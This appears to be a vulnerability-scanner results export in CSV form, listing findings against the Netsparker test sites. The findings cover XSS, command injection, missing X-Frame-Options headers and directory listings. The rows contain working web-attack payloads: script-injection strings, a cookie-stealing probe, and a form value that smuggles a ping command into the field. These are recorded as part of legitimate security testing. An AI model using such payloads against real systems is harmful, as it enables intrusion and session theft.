+Login Form Is Not Submitted Via HTTPS
+",""
+"VULNERABILITY","78419227","2111118","150081","http://aspnet.testsparker.com/Default.aspx","","","","http://testsparker.com/,http://aspnet.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","GET","http://aspnet.testsparker.com/Default.aspx","","The response for this request either did not have an ""X-FRAME-OPTIONS"" header present or was not set to DENY or SAMEORIGIN
+",""
+"VULNERABILITY","78419266","2111196","150159","http://php.testsparker.com/auth/login.php","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","GET","http://php.testsparker.com/auth/login.php","","PHPSESSID=375a1719e219e711f342095cfe2a9d4f; path=/; domain=php.testsparker.com",""
+"VULNERABILITY","78419272","2111208","150013","http://aspnet.testsparker.com/About.aspx?hello=%3Cscript%20src%3Dhttp%3A%2F%2Flocalhost%2Fj%20","hello","","","http://testsparker.com/,http://aspnet.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","hello=%3Cscript%20src%3Dhttp%3A%2F%2Flocalhost%2Fj%20","GET","http://aspnet.testsparker.com/About.aspx?hello=%3Cscript%20src%3Dhttp%3A%2F%2Flocalhost%2Fj%20","Referer: http://testsparker.com/
+Cookie: TestCookie=Hello; ASP.NET_SessionId=mhtebv2qhibfwkcqjtvkxzdj;
+","comment: 
+Response content-type: text/html
+
+enterMenu -->
+                
+    
+
+<style>
+    span#myspan4{
+        background-color: wheat;
+    }
+
+</style>
+<h1>About</h1>
+<p>
+    Hello
+    <span id=""contentCenterMenu_aboutReflectedCrossSiteScripting_lblVisitor""><script src=http://localhost/j </span>
+</p>
+<p>
+    Bitcoin is controlled by all Bitcoin users around the world. Developers are improving the software but they can't force a change in the rules of the Bitcoin protocol because all users are free to choose what softwa","<script src=http://localhost/j </span>"
+"VULNERABILITY","78419229","2111122","150022","http://angular.testsparker.com/api/getUser.php?username=ava'","username","","","http://testsparker.com/,http://angular.testsparker.com/,http://angular.testsparker.com/activity,http://angular.testsparker.com/user/ava","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","""'><<SCRIPT%20a=2>qss=7;//<</SCRIPT>","GET","http://angular.testsparker.com/api/getUser.php?username=%22'%3E%3C%3CSCRIPT%20a%3D2%3Eqss%3D7%3B%2F%2F%3C%3C%2FSCRIPT%3E","Referer: http://testsparker.com/
+","comment: Response status: 200
+<br />
+<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_all() on boolean in /home/ubuntu/spa_angular/public_html/api/getUser.php:17
+Stack trace:
+#0 {main}
+  thrown in <b>/home/ubuntu/spa_angular/public_html/api/getUser.php</b> on line <b>17</b><br />
+","Call to a member function fetch_all() on boolean in /home/ubuntu/spa_angular/public_html/api/getUser.php:17
+Stack trace:
+#0 {main}
+  thrown in <b>/home/ubuntu/spa_angular/public_html/api/getUser.php</b> on line"
+"VULNERABILITY","78419223","2111110","150059","http://php.testsparker.com/hello.php?name=Visitor","","","","http://testsparker.com/,http://php.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","","GET","http://php.testsparker.com/hello.php?name=Visitor","Referer: http://testsparker.com/
+","C:\AppServ\www\hello.php(24",""
+"VULNERABILITY","78419242","2111148","150124","http://aspnet.testsparker.com/Blogs.aspx","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","GET","http://aspnet.testsparker.com/Blogs.aspx","","The URI was framed.
+",""
+"VULNERABILITY","78419264","2111192","150055","http://php.testsparker.com/nslookup.php","param","","http://php.testsparker.com/nslookup.php","http://testsparker.com/,http://php.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","aaaa%26ping%20-n%2092%20localhost%26","POST","http://php.testsparker.com/nslookup.php","Referer: http://testsparker.com/
+Cookie: PHPSESSID=375a1719e219e711f342095cfe2a9d4f;
+","comment: (Times are expressed in milliseconds.)
+Expected response delay: 90000
+Observed response delay: 92325
+Mean response time: 79
+Standard deviation: 125
+Number of stddev from mean: 735.922758
+
+This vulnerability was identified using time-based inference that compared the average response time of a page to its response time with an injected payload. This vulnerability is confirmed based on timing rather than the content of the response.
+",""
+"VULNERABILITY","78419267","2111198","150084","http://php.testsparker.com/products.php?pro=%3C%0a%0dscript%20a%3D4%3Eqss%3D7%3C%0a%0d%2Fscript%3E","pro","","","http://testsparker.com/,http://php.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","pro=url%22'%3E%3Cqss%3E","GET","http://php.testsparker.com/products.php?pro=url%22'%3E%3Cqss%3E","Referer: http://testsparker.com/
+Cookie: PHPSESSID=375a1719e219e711f342095cfe2a9d4f;
+","comment: A significant portion of the XSS test payload appeared in the web page, but the page's DOM was not modified as expected for a successful exploit. This result should be manually verified to determine its accuracy.
+
+Response content-type: text/html
+
+/>
+<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />
+<title>Netsparker Test Web Site -  PHP</title>
+<link href=""style.css"" rel=""stylesheet"" type=""text/css"" media=""screen"" />
+</head><script type=text/javascript src = ""url""'><qss>"" ></script>
+<body>
+<div id=""wrapper"">
+
+	<div id=""menu"">
+		<ul>
+			<li><a href=""process.php?file=Generics/index.nsp"">Home</a></li>
+			<li><a href=""hello.php?name=Visitor"">Hello</a></li>
+			<li><a href=""products.php?pro=url"">Products</a></li","<qss>"
+"VULNERABILITY","78419239","2111142","150081","http://php.testsparker.com/","","","","http://testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","GET","http://php.testsparker.com/","","The response for this request either did not have an ""X-FRAME-OPTIONS"" header present or was not set to DENY or SAMEORIGIN
+",""
+"VULNERABILITY","78419251","2111166","150123","http://aspnet.testsparker.com/","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","GET","http://aspnet.testsparker.com/","","TestCookie=Hello; path=/; domain=aspnet.testsparker.com",""
+"VULNERABILITY","78419232","2111128","150004","http://aspnet.testsparker.com/statics/.","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","","GET","http://aspnet.testsparker.com/statics/.","Referer: http://testsparker.com/
+Cookie: TestCookie=Hello; ASP.NET_SessionId=mhtebv2qhibfwkcqjtvkxzdj;
+","comment: This directory was discovered during the crawl phase.
+
+<html><head><title>aspnet.testsparker.com - /statics/</title></head><body><H1>aspnet.testsparker.com - /statics/</H1><hr>
+
+<pre><A HREF=""/"">[To Parent Directory]</A><br><br> 4/11/2019  2:09 PM         1625 <A HREF=""/statics/btnBuyNowPricing.gif"">btnBuyNowPricing.gif</A><br> 4/11/2019  2:09 PM         1464 <A HREF=""/statics/btnBuyNowPricingBlue.gif"">btnBuyNowPricingBlue.gif</A><br> 4/11/2019  2:09 PM          176 <A HREF=""/statics/data.mdb"">data.mdb</A><br> 4/12/2019  9:51 AM        <dir>",""
+"VULNERABILITY","78419243","2111150","150081","http://aspnet.testsparker.com/Blogs.aspx","","","","http://testsparker.com/,http://aspnet.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","POST","http://aspnet.testsparker.com/Blogs.aspx","","The response for this request either did not have an ""X-FRAME-OPTIONS"" header present or was not set to DENY or SAMEORIGIN
+",""
+"VULNERABILITY","78419230","2111124","150059","http://aspnet.testsparker.com/GuestbookList.aspx","","","","http://testsparker.com/,http://aspnet.testsparker.com/,http://aspnet.testsparker.com/Guestbook.aspx","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","","GET","http://aspnet.testsparker.com/GuestbookList.aspx","Referer: http://testsparker.com/
+Cookie: TestCookie=Hello; ASP.NET_SessionId=mhtebv2qhibfwkcqjtvkxzdj;
+","c:\windows\win.ini",""
+"VULNERABILITY","78419260","2111184","150023","http://php.testsparker.com/auth/images/","","","","http://testsparker.com/,http://php.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","http://php.testsparker.com/auth/images/","GET","http://php.testsparker.com/auth/images/","Referer: http://testsparker.com/
+Cookie: PHPSESSID=375a1719e219e711f342095cfe2a9d4f;
+","comment: This directory was discovered during the path test phase.
+
+Original URL is: http://php.testsparker.com/auth/
+
+<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2 Final//EN"">
+<html>
+ <head>
+  <title>Index of /auth/images</title>
+ </head>
+ <body>
+<h1>Index of /auth/images</h1>
+<table><tr><th><img src=""/icons/blank.gif"" alt=""[ICO]""></th><th><a href=""?C=N;O=D"">Name</a></th><th><a href=""?C=M;O=A"">Last modified</a></th><th><a href=""?C=S;O=A"">Size</a></th><th><a href=""?C=D;O=A"">Description</a></th></tr><tr><th colspan=""5""><hr></th></tr>
+<tr><td valign=""top""><img src=""/icons/back.gif"" alt=""[DIR]""></td><td><a href=""/aut",""
+"VULNERABILITY","78419259","2111182","150059","http://aspnet.testsparker.com/favicon.ico","","","","http://testsparker.com/,http://aspnet.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","","GET","http://aspnet.testsparker.com/favicon.ico","Referer: http://testsparker.com/
+Cookie: TestCookie=Hello; ASP.NET_SessionId=mhtebv2qhibfwkcqjtvkxzdj;
+","C:\Websites\aspnet.testsparker\favicon.ico",""
+"VULNERABILITY","78419222","2111108","150001","http://php.testsparker.com/hello.php?name=%22'%3E%3Cqss%20a%3DX157322080Y1Z%3E","name","","","http://testsparker.com/,http://php.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","name=%22'%3E%3Cqss%20%60%3b!--%3D%26%7b()%7d%3E","GET","http://php.testsparker.com/hello.php?name=%22'%3E%3Cqss%20%60%3b!--%3D%26%7b()%7d%3E","Referer: http://testsparker.com/
+Cookie: PHPSESSID=375a1719e219e711f342095cfe2a9d4f;
+","comment: 
+Response content-type: text/html
+
+ss=""title""><a href=""#"">Hello Service </a></h1>
+					<p>
+                    Hello Visitor<br />
+<b>Parse error</b>:  syntax error, unexpected '""' in <b>C:\AppServ\www\hello.php(24) : eval()'d code</b> on line <b>1</b><br />
+20$str = 20 ""'><qss `;!--=&{()}>;20                    </p>
+
+				<div style=""clear: both;"">&nbsp;</div>
+				<div class=""entry"">
+
+
+				</div>
+			</div>
+		<div style=""clear: both;"">&nbsp;</div>
+		</div>
+		<!-- end #content -->
+	        
+	<div id=""sidebar"">
+			<ul","<qss `;!--=&{()}>"
+"VULNERABILITY","78419275","2111214","150124","http://aspnet.testsparker.com/Help.aspx","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","GET","http://aspnet.testsparker.com/Help.aspx","","The URI was framed.
+",""
+"VULNERABILITY","78419240","2111144","150022","http://aspnet.testsparker.com/WS_search.asmx/z--%3E%3Cqss%3E","","","","http://testsparker.com/,http://aspnet.testsparker.com/,http://aspnet.testsparker.com/About.aspx?hello=visitor","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","http://aspnet.testsparker.com/WS_search.asmx/z--%3E%3Cqss%3E","GET","http://aspnet.testsparker.com/WS_search.asmx/z--%3E%3Cqss%3E","Referer: http://testsparker.com/
+Cookie: TestCookie=Hello; ASP.NET_SessionId=mhtebv2qhibfwkcqjtvkxzdj;
+","comment: Response status: 500
+Original URL is: http://aspnet.testsparker.com/WS_search.asmx
+
+hite-space: pre-wrap; word-wrap: break-word; }
+         }
+         @media screen and (max-width: 479px) {
+          pre { width: 280px; }
+         }
+        </style>
+    </head>
+
+    <body bgcolor=""white"">
+
+            <span><H1>Server Error in '/' Application.<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>Request format is unrecognized for URL unexpectedly ending in '/z--><qss>'.</i> </h2></span>
+
+            <font face=""Arial, Helvetica, Geneva, SunSans-Re","<span><H1>Server Error in '/' Application."
+"VULNERABILITY","78419238","2111140","150022","http://aspnet.testsparker.com/WS_search.asmx/qss';func(document.cookie);'","","","","http://testsparker.com/,http://aspnet.testsparker.com/,http://aspnet.testsparker.com/About.aspx?hello=visitor","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","http://aspnet.testsparker.com/WS_search.asmx/qss';func(document.cookie);'","GET","http://aspnet.testsparker.com/WS_search.asmx/qss';func(document.cookie);'","Referer: http://testsparker.com/
+Cookie: TestCookie=Hello; ASP.NET_SessionId=mhtebv2qhibfwkcqjtvkxzdj;
+","comment: Response status: 500
+Original URL is: http://aspnet.testsparker.com/WS_search.asmx
+
+hite-space: pre-wrap; word-wrap: break-word; }
+         }
+         @media screen and (max-width: 479px) {
+          pre { width: 280px; }
+         }
+        </style>
+    </head>
+
+    <body bgcolor=""white"">
+
+            <span><H1>Server Error in '/' Application.<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>Request format is unrecognized for URL unexpectedly ending in '/qss';func(document.cookie);''.</i> </h2></span>
+
+            <font face=""Arial, Helvetica, Geneva, ","<span><H1>Server Error in '/' Application."
+"VULNERABILITY","78419235","2111134","150013","http://php.testsparker.com/artist.php?id=%3Cscript%20src%3Dhttp%3A%2F%2Flocalhost%2Fj%20","id","","http://php.testsparker.com/","http://testsparker.com/,http://php.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","id=%3Cscript%20src%3Dhttp%3A%2F%2Flocalhost%2Fj%20","GET","http://php.testsparker.com/artist.php?id=%3Cscript%20src%3Dhttp%3A%2F%2Flocalhost%2Fj%20","Referer: http://testsparker.com/
+Cookie: PHPSESSID=375a1719e219e711f342095cfe2a9d4f;
+","comment: 
+Response content-type: text/html
+
+
+		<div id=""content"">
+			<div class=""post"">
+				<h2 class=""title""><a href=""artist.php#"">Artist Service</a></h2>
+
+				<div style=""clear: both;"">&nbsp;</div>
+				<div class=""entry"">
+					<p>
+                    
+<h3>Results: <script src=http://localhost/j </h3></br>
+
+no rows returned 
+                    </p>
+
+				</div>
+			</div>
+		<div style=""clear: both;"">&nbsp;</div>
+		</div>
+		<!-- end #content -->
+	        
+	<div id=""sidebar"">
+			<ul>
+				<li>
+					<div id=""search"" >
+	","<script src=http://localhost/j </h3>"
+"VULNERABILITY","78419283","2111230","150022","http://aspnet.testsparker.com/WS_search.asmx/%27%20onmouseover%3D%27alert%289%29%3B%27","","","","http://testsparker.com/,http://aspnet.testsparker.com/,http://aspnet.testsparker.com/About.aspx?hello=visitor","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","http://aspnet.testsparker.com/WS_search.asmx/%27%20onmouseover%3D%27alert%289%29%3B%27","GET","http://aspnet.testsparker.com/WS_search.asmx/%27%20onmouseover%3D%27alert%289%29%3B%27","Referer: http://testsparker.com/
+Cookie: TestCookie=Hello; ASP.NET_SessionId=mhtebv2qhibfwkcqjtvkxzdj;
+","comment: Response status: 500
+Original URL is: http://aspnet.testsparker.com/WS_search.asmx
+
+hite-space: pre-wrap; word-wrap: break-word; }
+         }
+         @media screen and (max-width: 479px) {
+          pre { width: 280px; }
+         }
+        </style>
+    </head>
+
+    <body bgcolor=""white"">
+
+            <span><H1>Server Error in '/' Application.<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>Request format is unrecognized for URL unexpectedly ending in '/' onmouseover='alert(9);''.</i> </h2></span>
+
+            <font face=""Arial, Helvetica, Geneva, Sun","<span><H1>Server Error in '/' Application."
+"VULNERABILITY","78419245","2111154","150124","http://testsparker.com/","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","GET","http://testsparker.com/","","The URI was framed.
+",""
+"VULNERABILITY","78419276","2111216","150081","http://aspnet.testsparker.com/Help.aspx","","","","http://testsparker.com/,http://aspnet.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","GET","http://aspnet.testsparker.com/Help.aspx","","The response for this request either did not have an ""X-FRAME-OPTIONS"" header present or was not set to DENY or SAMEORIGIN
+",""
+"VULNERABILITY","78419257","2111178","150023","http://php.testsparker.com/test/","","","","http://testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","http://php.testsparker.com/test/","GET","http://php.testsparker.com/test/","Referer: http://testsparker.com/
+Cookie: PHPSESSID=375a1719e219e711f342095cfe2a9d4f;
+","comment: This directory was discovered during the path test phase.
+
+Original URL is: http://php.testsparker.com/
+
+<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2 Final//EN"">
+<html>
+ <head>
+  <title>Index of /test</title>
+ </head>
+ <body>
+<h1>Index of /test</h1>
+<table><tr><th><img src=""/icons/blank.gif"" alt=""[ICO]""></th><th><a href=""?C=N;O=D"">Name</a></th><th><a href=""?C=M;O=A"">Last modified</a></th><th><a href=""?C=S;O=A"">Size</a></th><th><a href=""?C=D;O=A"">Description</a></th></tr><tr><th colspan=""5""><hr></th></tr>
+<tr><td valign=""top""><img src=""/icons/back.gif"" alt=""[DIR]""></td><td><a href=""/"">Parent Director",""
+"VULNERABILITY","78419254","2111172","150124","http://aspnet.testsparker.com/Request.aspx?r=%2Fstatics%2Fdownload%2F","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","GET","http://aspnet.testsparker.com/Request.aspx?r=%2Fstatics%2Fdownload%2F","","The URI was framed.
+",""
+"VULNERABILITY","78419219","2111102","150053","http://aspnet.testsparker.com/Dashboard/","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","POST","http://aspnet.testsparker.com/Dashboard/","","comment: Parent URL of Login Form is : http://aspnet.testsparker.com/administrator/?r=/Dashboard/
+Login Form Is Not Submitted Via HTTPS
+",""
+"VULNERABILITY","78419255","2111174","150081","http://aspnet.testsparker.com/Request.aspx?r=%2Fstatics%2Fdownload%2F","","","","http://testsparker.com/,http://aspnet.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","GET","http://aspnet.testsparker.com/Request.aspx?r=%2Fstatics%2Fdownload%2F","","The response for this request either did not have an ""X-FRAME-OPTIONS"" header present or was not set to DENY or SAMEORIGIN
+",""
+"VULNERABILITY","78419253","2111170","150081","http://aspnet.testsparker.com/","","","","http://testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","POST","http://aspnet.testsparker.com/","","The response for this request either did not have an ""X-FRAME-OPTIONS"" header present or was not set to DENY or SAMEORIGIN
+",""
+"VULNERABILITY","78419270","2111204","150112","http://angular.testsparker.com/","","","","","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","GET","http://angular.testsparker.com/","","The following password field(s) in the form do not set autocomplete=""off"":
+(Field name: password, Field id: password)
+Parent URL of form is: http://angular.testsparker.com/results
+",""
+"VULNERABILITY","78419225","2111114","150022","http://aspnet.testsparker.com/redirect.aspx?site=%0A%7Caaaa%0A%3D(23.0231*213.759)%0A%7C%24%7B23.0231*213.759%7D%7B23.0231*213.759%7D%7B%7B23.0231*213.759%7D%7D(23.0231*213.7591)%3D(23.0231*213.759)%23%7B23.0231*213.759%7D%3C%25%3D%2023.0231*213.759%20%25%3E","site","","","http://testsparker.com/,http://aspnet.testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","%0A|aaaa%0A%3D(23.0231*213.759)%0A|${23.0231*213.759}{23.0231*213.759}{{23.0231*213.759}}(23.0231*213.7591)%3D(23.0231*213.759)%23{23.0231*213.759}<%25%3D%2023.0231*213.759%20%25>","GET","http://aspnet.testsparker.com/redirect.aspx?site=%0A%7Caaaa%0A%3D(23.0231*213.759)%0A%7C%24%7B23.0231*213.759%7D%7B23.0231*213.759%7D%7B%7B23.0231*213.759%7D%7D(23.0231*213.7591)%3D(23.0231*213.759)%23%7B23.0231*213.759%7D%3C%25%3D%2023.0231*213.759%20%25%3E","Referer: http://testsparker.com/
+Cookie: TestCookie=Hello; ASP.NET_SessionId=mhtebv2qhibfwkcqjtvkxzdj;
+","comment: Response status: 500
+hite-space: pre-wrap; word-wrap: break-word; }
+         }
+         @media screen and (max-width: 479px) {
+          pre { width: 280px; }
+         }
+        </style>
+    </head>
+
+    <body bgcolor=""white"">
+
+            <span><H1>Server Error in '/' Application.<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>Redirect URI cannot contain newline characters.</i> </h2></span>
+
+            <font face=""Arial, Helvetica, Geneva, SunSans-Regular, sans-serif "">
+
+            <","<span><H1>Server Error in '/' Application."
+"VULNERABILITY","78419271","2111206","150081","http://angular.testsparker.com/","","","","http://testsparker.com/","Not Required","No","","No","","","","","24 Apr 2019 01:41AM GMT","N/A","GET","http://angular.testsparker.com/","","The response for this request either did not have an ""X-FRAME-OPTIONS"" header present or was not set to DENY or SAMEORIGIN
+",""
+"INFORMATION_GATHERED","ID","Detection ID","QID","Results","Detection Date"
+"INFORMATION_GATHERED","78419201","1066428","150028","Total cookies: 3
+ASP.NET_SessionId=mhtebv2qhibfwkcqjtvkxzdj; HttpOnly; path=/ First set at URL: http://aspnet.testsparker.com/
+TestCookie=Hello; path=/ First set at URL: http://aspnet.testsparker.com/
+PHPSESSID=375a1719e219e711f342095cfe2a9d4f; path=/ First set at URL: http://php.testsparker.com/auth/login.php
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419208","1027723","45017","#table cols=""3""
+Operating_System Technique ID
+
+Windows_Vista_/_Windows_2008_/_Windows_7_/_Windows_2012_/_Windows_8_/_Windows_10 TCP/IP_Fingerprint U3414:80
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419198","1027720","150021","Loaded 0 blacklist entries.
+Loaded 0 whitelist entries.
+HTML form authentication unavailable, no WEBAPP entry found
+Batch #0 VirtualHostDiscovery: estimated time < 1 minute (35 tests, 0 inputs)
+VirtualHostDiscovery: 35 vulnsigs tests, completed 35  requests, 0 seconds. Completed 35 requests of 35 estimated requests (100%). All tests completed.
+Batch #0 CMSDetection: estimated time < 1 minute (1 tests, 1 inputs)
+[CMSDetection phase] : No potential CMS found. Aborting the CMS Detection phaseCMSDetection: 1 vulnsigs tests, completed 38  requests, 0 seconds. Completed 38 requests of 38 estimated requests (100%). All tests completed.
+Collected 209 links overall in 0 hours 6 minutes duration.
+Path manipulation: Estimated requests (payloads x links): files with extension:(0 x 59) + files:(0 x 80) +  directories:(9 x 85) +  paths:(0 x 165) = total (765) 
+Batch #0 WS Directory Path manipulation: estimated time < 10 minutes (9 tests, 165 inputs)
+WS Directory Path manipulation: 9 vulnsigs tests, completed 729  requests, 3 seconds. Completed 729 requests of 765 estimated requests (95.2941%). All tests completed.
+Batch #0 WS enumeration: estimated time < 10 minutes (11 tests, 205 inputs)
+WS enumeration: 11 vulnsigs tests, completed 982  requests, 5 seconds. Completed 982 requests of 2255 estimated requests (43.5477%). All tests completed.
+Batch #1 URI parameter manipulation (no auth): estimated time < 1 minute (58 tests, 15 inputs)
+Batch #1 URI parameter manipulation (no auth): 58 vulnsigs tests, completed 874  requests, 5 seconds. Completed 874 requests of 870 estimated requests (100.46%). All tests completed.
+Batch #1 Form parameter manipulation (no auth): estimated time < 10 minutes (58 tests, 47 inputs)
+Batch #1 Form parameter manipulation (no auth): 58 vulnsigs tests, completed 2139  requests, 20 seconds. Completed 2139 requests of 2726 estimated requests (78.4666%). All tests completed.
+Batch #1 URI blind SQL manipulation (no auth): estimated time < 1 minute (8 tests, 15 inputs)
+Batch #1 URI blind SQL manipulation (no auth): 8 vulnsigs tests, completed 320  requests, 2 seconds. Completed 320 requests of 360 estimated requests (88.8889%). All tests completed.
+Batch #1 Form blind SQL manipulation (no auth): estimated time < 1 minute (8 tests, 47 inputs)
+Batch #1 Form blind SQL manipulation (no auth): 8 vulnsigs tests, completed 642  requests, 5 seconds. Completed 642 requests of 1128 estimated requests (56.9149%). All tests completed.
+Batch #1 URI parameter time-based tests (no auth): estimated time < 1 minute (12 tests, 15 inputs)
+Batch #1 URI parameter time-based tests (no auth): 12 vulnsigs tests, completed 180  requests, 91 seconds. Completed 180 requests of 180 estimated requests (100%). All tests completed.
+Batch #1 Form field time-based tests (no auth): estimated time < 1 minute (12 tests, 47 inputs)
+Batch #1 Form field time-based tests (no auth): 12 vulnsigs tests, completed 348  requests, 187 seconds. Completed 348 requests of 564 estimated requests (61.7021%). All tests completed.
+Batch #1 URI parameter time-based tests for CVE-2011-3923 (no auth): estimated time < 1 minute (1 tests, 15 inputs)
+Batch #1 URI parameter time-based tests for CVE-2011-3923 (no auth): 1 vulnsigs tests, completed 15  requests, 0 seconds. Completed 15 requests of 15 estimated requests (100%). All tests completed.
+Batch #1 Form field time-based tests for CVE-2011-3923 (no auth): estimated time < 1 minute (1 tests, 47 inputs)
+Batch #1 Form field time-based tests for CVE-2011-3923 (no auth): 1 vulnsigs tests, completed 29  requests, 1 seconds. Completed 29 requests of 47 estimated requests (61.7021%). All tests completed.
+Batch #2 URI parameter manipulation (no auth): estimated time < 1 minute (58 tests, 12 inputs)
+Batch #2 URI parameter manipulation (no auth): 58 vulnsigs tests, completed 693  requests, 4 seconds. Completed 693 requests of 696 estimated requests (99.569%). All tests completed.
+Batch #2 Form parameter manipulation (no auth): estimated time < 1 minute (58 tests, 2 inputs)
+Batch #2 Form parameter manipulation (no auth): 58 vulnsigs tests, completed 57  requests, 0 seconds. Completed 57 requests of 116 estimated requests (49.1379%). All tests completed.
+Batch #2 URI blind SQL manipulation (no auth): estimated time < 1 minute (8 tests, 12 inputs)
+Batch #2 URI blind SQL manipulation (no auth): 8 vulnsigs tests, completed 213  requests, 1 seconds. Completed 213 requests of 288 estimated requests (73.9583%). All tests completed.
+Batch #2 Form blind SQL manipulation (no auth): estimated time < 1 minute (8 tests, 2 inputs)
+Batch #2 Form blind SQL manipulation (no auth): 8 vulnsigs tests, completed 16  requests, 0 seconds. Completed 16 requests of 48 estimated requests (33.3333%). All tests completed.
+Batch #2 URI parameter time-based tests (no auth): estimated time < 1 minute (12 tests, 12 inputs)
+Batch #2 URI parameter time-based tests (no auth): 12 vulnsigs tests, completed 132  requests, 91 seconds. Completed 132 requests of 144 estimated requests (91.6667%). All tests completed.
+Batch #2 Form field time-based tests (no auth): estimated time < 1 minute (12 tests, 2 inputs)
+Batch #2 Form field time-based tests (no auth): 12 vulnsigs tests, completed 12  requests, 0 seconds. Completed 12 requests of 24 estimated requests (50%). All tests completed.
+Batch #2 URI parameter time-based tests for CVE-2011-3923 (no auth): estimated time < 1 minute (1 tests, 12 inputs)
+Batch #2 URI parameter time-based tests for CVE-2011-3923 (no auth): 1 vulnsigs tests, completed 11  requests, 0 seconds. Completed 11 requests of 12 estimated requests (91.6667%). All tests completed.
+Batch #2 Form field time-based tests for CVE-2011-3923 (no auth): estimated time < 1 minute (1 tests, 2 inputs)
+Batch #2 Form field time-based tests for CVE-2011-3923 (no auth): 1 vulnsigs tests, completed 1  requests, 0 seconds. Completed 1 requests of 2 estimated requests (50%). All tests completed.
+Batch #3 URI parameter manipulation (no auth): estimated time < 1 minute (58 tests, 8 inputs)
+Batch #3 URI parameter manipulation (no auth): 58 vulnsigs tests, completed 496  requests, 1 seconds. Completed 496 requests of 464 estimated requests (106.897%). All tests completed.
+Batch #3 URI blind SQL manipulation (no auth): estimated time < 1 minute (8 tests, 8 inputs)
+Batch #3 URI blind SQL manipulation (no auth): 8 vulnsigs tests, completed 272  requests, 1 seconds. Completed 272 requests of 192 estimated requests (141.667%). All tests completed.
+Batch #3 URI parameter time-based tests (no auth): estimated time < 1 minute (12 tests, 8 inputs)
+Batch #3 URI parameter time-based tests (no auth): 12 vulnsigs tests, completed 96  requests, 180 seconds. Completed 96 requests of 96 estimated requests (100%). All tests completed.
+Batch #3 URI parameter time-based tests for CVE-2011-3923 (no auth): estimated time < 1 minute (1 tests, 8 inputs)
+Batch #3 URI parameter time-based tests for CVE-2011-3923 (no auth): 1 vulnsigs tests, completed 8  requests, 0 seconds. Completed 8 requests of 8 estimated requests (100%). All tests completed.
+Batch #4 XXE time-based tests (no auth): estimated time < 1 minute (1 tests, 3 inputs)
+Batch #4 XXE time-based tests (no auth): 1 vulnsigs tests, completed 1  requests, 0 seconds. Completed 1 requests of 3 estimated requests (33.3333%). All tests completed.
+Batch #4 XXE parameter tests (no auth): estimated time < 1 minute (4 tests, 3 inputs)
+Batch #4 XXE parameter tests (no auth): 4 vulnsigs tests, completed 1  requests, 0 seconds. Completed 1 requests of 12 estimated requests (8.33333%). All tests completed.
+Batch #4 DOM XSS exploitation: estimated time < 1 minute (4 tests, 5 inputs)
+Batch #4 DOM XSS exploitation: 4 vulnsigs tests, completed 40  requests, 39 seconds. No tests to execute.
+Batch #4 HTTP call manipulation: estimated time < 1 minute (33 tests, 2 inputs)
+Batch #4 HTTP call manipulation: 33 vulnsigs tests, completed 132  requests, 0 seconds. Completed 132 requests of 330 estimated requests (40%). All tests completed.
+Batch #4 Open Redirect analysis: estimated time < 1 minute (1 tests, 2 inputs)
+Batch #4 Open Redirect analysis: 1 vulnsigs tests, completed 1  requests, 2 seconds. Completed 1 requests of 2 estimated requests (50%). All tests completed.
+CSRF tests will not be launched because the scan is not successfully authenticated.
+Batch #4 File Inclusion analysis: estimated time < 1 minute (1 tests, 203 inputs)
+Batch #4 File Inclusion analysis: 1 vulnsigs tests, completed 1  requests, 0 seconds. Completed 1 requests of 203 estimated requests (0.492611%). All tests completed.
+Batch #4 Cookie manipulation: estimated time < 1 minute (37 tests, 3 inputs)
+Batch #4 Cookie manipulation: 37 vulnsigs tests, completed 2647  requests, 16 seconds. Completed 2647 requests of 2609 estimated requests (101.456%). XSS optimization removed 3288 links. All tests completed.
+Batch #4 Header manipulation: estimated time < 10 minutes (37 tests, 138 inputs)
+Batch #4 Header manipulation: 37 vulnsigs tests, completed 3079  requests, 18 seconds. Completed 3079 requests of 6900 estimated requests (44.6232%). XSS optimization removed 3312 links. All tests completed.
